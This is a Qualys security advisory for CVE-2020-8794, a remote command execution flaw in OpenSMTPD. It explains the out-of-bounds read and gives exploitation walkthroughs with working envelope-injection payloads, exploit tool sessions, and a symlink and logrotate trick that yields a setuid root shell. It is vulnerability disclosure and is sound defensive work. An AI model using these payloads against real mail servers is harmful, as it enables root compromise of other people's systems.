@@ -1,0 +1,466 @@
+
+Date: Wed, 26 Feb 2020 12:28:19 -0800
+From: Qualys Security Advisory <qsa@...lys.com>
+To: oss-security@...ts.openwall.com
+Subject: Re: LPE and RCE in OpenSMTPD's default install
+ (CVE-2020-8794)
+
+
+Qualys Security Advisory
+
+LPE and RCE in OpenSMTPD's default install (CVE-2020-8794)
+
+
+==============================================================================
+Contents
+==============================================================================
+
+Summary
+Analysis
+Client-side exploitation (new grammar)
+Server-side exploitation (new grammar)
+Old-grammar exploitation
+Acknowledgments
+
+
+==============================================================================
+Summary
+==============================================================================
+
+We discovered a vulnerability in OpenSMTPD, OpenBSD's mail server. This
+vulnerability, an out-of-bounds read introduced in December 2015 (commit
+80c6a60c, "when peer outputs a multi-line response ..."), is exploitable
+remotely and leads to the execution of arbitrary shell commands: either
+as root, after May 2018 (commit a8e22235, "switch smtpd to new
+grammar"); or as any non-root user, before May 2018.
+
+Because this vulnerability resides in OpenSMTPD's client-side code
+(which delivers mail to remote SMTP servers), we must consider two
+different scenarios:
+
+- Client-side exploitation: This vulnerability is remotely exploitable
+  in OpenSMTPD's (and hence OpenBSD's) default configuration. Although
+  OpenSMTPD listens on localhost only, by default, it does accept mail
+  from local users and delivers it to remote servers. If such a remote
+  server is controlled by an attacker (either because it is malicious or
+  compromised, or because of a man-in-the-middle, DNS, or BGP attack --
+  SMTP is not TLS-encrypted by default), then the attacker can execute
+  arbitrary shell commands on the vulnerable OpenSMTPD installation.
+
+- Server-side exploitation: First, the attacker must connect to the
+  OpenSMTPD server (which accepts external mail) and send a mail that
+  creates a bounce. Next, when OpenSMTPD connects back to their mail
+  server to deliver this bounce, the attacker can exploit OpenSMTPD's
+  client-side vulnerability. Last, for their shell commands to be
+  executed, the attacker must (to the best of our knowledge) crash
+  OpenSMTPD and wait until it is restarted (either manually by an
+  administrator, or automatically by a system update or reboot).
+
+We developed a simple exploit for this vulnerability and successfully
+tested it against OpenBSD 6.6 (the current release), OpenBSD 5.9 (the
+first vulnerable release), Debian 10 (stable), Debian 11 (testing), and
+Fedora 31. At OpenBSD's request, and to give OpenSMTPD's users a chance
+to patch their systems, we are withholding the exploitation details and
+code until Wednesday, February 26, 2020.
+
+Last-minute note: we tested our exploit against the recent changes in
+OpenSMTPD 6.6.3p1, and our results are: if the "mbox" method is used for
+local delivery (the default in OpenBSD -current), then arbitrary command
+execution as root is still possible; otherwise (if the "maildir" method
+is used, for example), arbitrary command execution as any non-root user
+is possible.
+
+
+==============================================================================
+Analysis
+==============================================================================
+
+SMTP clients connect to SMTP servers and send commands such as EHLO,
+MAIL FROM, and RCPT TO. SMTP servers respond with either single-line or
+multiple-line replies:
+
+- the first lines begin with a three-digit code and a hyphen ('-'),
+  followed by an optional text (for example, "250-ENHANCEDSTATUSCODES");
+
+- the last line begins with the same three-digit code, followed by an
+  optional space (' ') and text (for example, "250 HELP").
+
+In OpenSMTPD's client-side code, these multiline replies are parsed by
+the mta_io() function:
+
+------------------------------------------------------------------------------
+1098 static void
+1099 mta_io(struct io *io, int evt, void *arg)
+1100 {
+....
+1133         case IO_DATAIN:
+1134             nextline:
+1135                 line = io_getline(s->io, &len);
+....
+1146                 if ((error = parse_smtp_response(line, len, &msg, &cont))) {
+------------------------------------------------------------------------------
+
+- the first lines (when line[3] == '-') are concatenated into a 2KB
+  replybuf:
+
+------------------------------------------------------------------------------
+1177                 if (cont) {
+1178                         if (s->replybuf[0] == '\0')
+1179                                 (void)strlcat(s->replybuf, line, sizeof s->replybuf);
+1180                         else {
+1181                                 line = line + 4;
+....
+1187                                         (void)strlcat(s->replybuf, line, sizeof s->replybuf);
+1188                         }
+1189                         goto nextline;
+1190                 }
+------------------------------------------------------------------------------
+
+- the last line (when line[3] != '-') is also concatenated into
+  replybuf:
+
+------------------------------------------------------------------------------
+1195                 if (s->replybuf[0] != '\0') {
+1196                         p = line + 4;
+....
+1201                         if (strlcat(s->replybuf, p, sizeof s->replybuf) >= sizeof s->replybuf)
+------------------------------------------------------------------------------
+
+Unfortunately, if the last line's three-digit code is not followed by
+the optional space and text, then p (at line 1196) points to the first
+character *after* the line's '\0' terminator (which replaced the line's
+'\n' terminator in iobuf_getline()), and this out-of-bounds string is
+concatenated into replybuf (at line 1201).
+
+The three following key insights explain how we transformed this
+out-of-bounds read into a reliable command execution:
+
+- We (attackers) precisely control the "out-of-bounds" string that
+  follows the last line of our reply, because OpenSMTPD reads our reply
+  in blocks, not character by character: if we send a last "line" of the
+  form "xyz\nstring\0", then "string" is concatenated into replybuf.
+
+- If the three-digit code of our reply indicates a temporary error (4yz)
+  or a permanent error (5yz), then the contents of replybuf are written
+  to the "errorline" field of the envelope that internally describes the
+  mail that OpenSMTPD is trying to deliver.
+
+- This envelope is basically a file that contains lines of the form
+  "field: data\n", and our out-of-bounds string (which is written to the
+  "errorline" field of the envelope) can contain '\n' characters: we can
+  inject new lines into the envelope and change OpenSMTPD's behavior.
+
+
+==============================================================================
+Client-side exploitation (new grammar)
+==============================================================================
+
+The client-side exploitation of this vulnerability is straightforward;
+we wait until OpenSMTPD connects to our mail server and respond with a
+multiline reply (a permanent error) that creates a bounce and injects
+the following lines into its envelope:
+
+------------------------------------------------------------------------------
+type: mda
+mda-exec: our arbitrary shell command
+dispatcher: local_mail
+mda-user: root
+------------------------------------------------------------------------------
+
+where "local_mail" is the name of OpenSMTPD's local dispatcher (from its
+default configuration). Our MDA command is immediately executed when
+OpenSMTPD tries to deliver this bounce, because our injected lines
+changed its type from MTA (Message Transfer Agent) to MDA (Message
+Delivery Agent). For example, against OpenBSD 6.6:
+
+- First, on the OpenBSD machine, a local user sends a mail (where
+  "[192.168.56.1]" is the IP address of the attacker's mail server, but
+  it could also be a trusted but compromised or hijacked domain name --
+  for example, the sendbug(1) utility sends mail to bugs@...nbsd.org):
+
+------------------------------------------------------------------------------
+$ id
+uid=1001(john) gid=1001(john) groups=1001(john)
+
+$ echo test | /usr/sbin/sendmail 'test@[192.168.56.1]'
+------------------------------------------------------------------------------
+
+- Next, on the attacker's mail server:
+
+------------------------------------------------------------------------------
+# ./ent-of-line
+...
+Connection from 192.168.56.104:39404
+...
+<-- MAIL FROM:<john@...d66.example.org>
+--> 553-Error
+--> 553
+
+type:mda
+mda-exec:X=`mktemp /tmp/x.XXXXXX`&&id>>$X;exit 0
+dispatcher:local_mail
+mda-user:root
+------------------------------------------------------------------------------
+
+- Last, on the OpenBSD machine:
+
+------------------------------------------------------------------------------
+# cat /tmp/x.*
+uid=0(root) gid=0(wheel) groups=0(wheel)
+------------------------------------------------------------------------------
+
+
+==============================================================================
+Server-side exploitation (new grammar)
+==============================================================================
+
+The server-side exploitation of this vulnerability is more complicated;
+we face three different problems:
+
+- The vulnerability resides in OpenSMTPD's client-side code, not
+  server-side code. To solve this first problem, we connect to the
+  OpenSMTPD server, send a mail that creates a bounce (by requesting a
+  Delivery Status Notification or simulating a mail loop), and wait a
+  few minutes until OpenSMTPD connects to our mail server to deliver
+  this bounce.
+
+- We cannot respond to this bounce delivery with a permanent error:
+  OpenSMTPD would simply discard this "bounced" bounce (a double bounce)
+  and hence our injected lines. To solve this second problem, we respond
+  with a temporary error instead, which keeps the bounce and injects our
+  new lines into its envelope.
+
+- OpenSMTPD does not immediately execute our injected MDA command,
+  because it still caches the bounce in its MTA queue, not MDA queue.
+  Our solution to this third problem is not ideal (but better solutions
+  may exist): we force OpenSMTPD to "lose its memory" by crashing it (we
+  re-exploit the vulnerability, and inject a fatal "type: invalid" line
+  into the envelope of a second bounce), and we wait until OpenSMTPD is
+  restarted (either manually by an administrator, or automatically by a
+  system update or reboot). As soon as OpenSMTPD restarts, it executes
+  the injected MDA command of our first bounce (and simply ignores our
+  invalid, second bounce).
+
+For example, against OpenBSD 6.6:
+
+- First, on the attacker's mail server (where "192.168.56.104" is the
+  OpenBSD machine, "192.168.56.1" is the attacker's mail server, and
+  "root@...mple.org" is a valid mail address on the OpenBSD machine):
+
+------------------------------------------------------------------------------
+# ./ent-of-line 192.168.56.104 'test@[192.168.56.1]' root@...mple.org
+...
+Connected to 192.168.56.104:25
+...
+--> MAIL FROM:<test@[192.168.56.1]>
+<-- 250 2.0.0 Ok
+--> RCPT TO:<root@...mple.org> NOTIFY=SUCCESS
+<-- 250 2.1.5 Destination address valid: Recipient ok
+...
+Connection from 192.168.56.104:40061
+...
+<-- MAIL FROM:<>
+--> 421-Error
+--> 421
+
+type:mda
+mda-exec:X=`mktemp /tmp/x.XXXXXX`&&id>>$X;exit 0
+dispatcher:local_mail
+mda-user:root
+
+Connected to 192.168.56.104:25
+...
+--> MAIL FROM:<test@[192.168.56.1]>
+<-- 250 2.0.0 Ok
+--> RCPT TO:<root@...mple.org> NOTIFY=SUCCESS
+<-- 250 2.1.5 Destination address valid: Recipient ok
+...
+Connection from 192.168.56.104:20037
+...
+<-- MAIL FROM:<>
+--> 421-Error
+--> 421
+
+type:invalid
+------------------------------------------------------------------------------
+
+- Then, on the OpenBSD machine (when the administrator restarts the
+  crashed OpenSMTPD):
+
+------------------------------------------------------------------------------
+# cat /tmp/x.*
+cat: /tmp/x.*: No such file or directory
+
+# rcctl restart smtpd
+smtpd(ok)
+
+# cat /tmp/x.*
+uid=0(root) gid=0(wheel) groups=0(wheel)
+------------------------------------------------------------------------------
+
+
+==============================================================================
+Old-grammar exploitation
+==============================================================================
+
+To exploit older OpenSMTPD versions (before commit a8e22235, "switch
+smtpd to new grammar"), we inject the following lines instead:
+
+------------------------------------------------------------------------------
+type: mda
+mda-buffer: our arbitrary shell command
+mda-method: mda
+mda-user: nobody
+mda-usertable: <getpwnam>
+------------------------------------------------------------------------------
+
+where "nobody" can be any user except root. The ability to execute
+arbitrary commands as any non-root user is usually enough to obtain full
+root privileges: the attacker can trojan an administrator's su, sudo, or
+doas; and some system users have privileges that can be escalated to
+root.
+
+Moreover, after the attacker obtains a non-root shell on an older
+OpenSMTPD installation, they can re-exploit the vulnerability and use
+the MDA method "maildir" instead of "mda":
+
+- they can invoke this method as root and create a file in an arbitrary
+  directory of the filesystem (because the "maildir" method follows
+  symlinks);
+
+- they partly control the contents of this file (it contains the body of
+  their mail).
+
+For example, on Debian 10, the attacker can create a file in
+/etc/logrotate.d and execute arbitrary commands, as root:
+
+- First, on the attacker's mail server (where "192.168.56.141" is the
+  Debian machine, "192.168.56.1" is the attacker's mail server, and
+  "root@...mple.org" is a valid mail address on the Debian machine):
+
+------------------------------------------------------------------------------
+# ./ent-of-line -u nobody 192.168.56.141 'test@[192.168.56.1]' root@...mple.org
+...
+Connected to 192.168.56.141:25
+...
+--> MAIL FROM:<test@[192.168.56.1]>
+<-- 250 2.0.0: Ok
+--> RCPT TO:<root@...mple.org> NOTIFY=SUCCESS
+<-- 250 2.1.5 Destination address valid: Recipient ok
+...
+Connection from 192.168.56.141:35378
+...
+<-- MAIL FROM:<>
+--> 421-Error
+--> 421
+
+type:mda
+mda-buffer:X=`mktemp /tmp/x.XXXXXX`&&id>>$X;exit 0
+mda-method:mda
+mda-user:nobody
+mda-usertable:<getpwnam>
+
+Connected to 192.168.56.141:25
+...
+--> MAIL FROM:<test@[192.168.56.1]>
+<-- 250 2.0.0: Ok
+--> RCPT TO:<root@...mple.org> NOTIFY=SUCCESS
+<-- 250 2.1.5 Destination address valid: Recipient ok
+...
+Connection from 192.168.56.141:35380
+...
+<-- MAIL FROM:<>
+--> 421-Error
+--> 421
+
+type:invalid
+------------------------------------------------------------------------------
+
+- Second, on the Debian machine (when the administrator restarts the
+  crashed OpenSMTPD):
+
+------------------------------------------------------------------------------
+# cat /tmp/x.*
+cat: '/tmp/x.*': No such file or directory
+
+# systemctl restart opensmtpd.service
+
+# cat /tmp/x.*
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+------------------------------------------------------------------------------
+
+- Third, on the Debian machine (after the attacker obtained a "nobody"
+  shell):
+
+------------------------------------------------------------------------------
+$ id
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+
+$ mkdir -m 0700 /tmp/maildir
+$ cd /tmp/maildir
+
+$ ln -s /etc tmp
+$ ln -s /etc/logrotate.d new
+
+$ /usr/sbin/sendmail 'test@[192.168.56.1]' << 'EOF'
+/var/log/lastlog {
+    missingok
+    rotate 1
+    nomail
+    size 1
+    copy
+    firstaction
+        cp -f /bin/bash /var/log && chmod 04555 /var/log/bash
+    endscript
+}
+EOF
+------------------------------------------------------------------------------
+
+- Fourth, on the attacker's mail server:
+
+------------------------------------------------------------------------------
+# ./ent-of-line -m /tmp/maildir
+...
+Connection from 192.168.56.141:35382
+...
+<-- MAIL FROM:<nobody@...ian>
+--> 553-Error
+--> 553
+
+type:mda
+mda-buffer:/tmp/maildir
+mda-method:maildir
+mda-user:root
+mda-usertable:<getpwnam>
+------------------------------------------------------------------------------
+
+- Last, on the Debian machine (after cron or systemd executed
+  logrotate):
+
+------------------------------------------------------------------------------
+$ id
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+
+$ /var/log/bash -p
+
+# id
+uid=65534(nobody) gid=65534(nogroup) euid=0(root) groups=65534(nogroup)
+------------------------------------------------------------------------------
+
+
+==============================================================================
+Acknowledgments
+==============================================================================
+
+We thank OpenBSD's developers for their quick response and patches. We
+also thank Gilles for his hard work and beautiful code.
+
+
+
+[https://d1dejaj6dcqv24.cloudfront.net/asset/image/email-banner-384-2x.png]<https://www.qualys.com/email-banner>
+
+
+
+This message may contain confidential and privileged information. If it has been sent to you in error, please reply to advise the sender of the error and then immediately delete it. If you are not the intended recipient, do not read, copy, disclose or otherwise use this message. The sender disclaims any liability for such unauthorized use. NOTE that all incoming emails sent to Qualys email accounts will be archived and may be scanned by us and/or by external service providers to detect and prevent threats to our systems, investigate illegal or inappropriate behavior, and/or eliminate unsolicited promotional emails (“spam”). If you have any concerns about this process, please contact us.
+
+View attachment "ent-of-line.c" of type "text/plain" (11419 bytes)
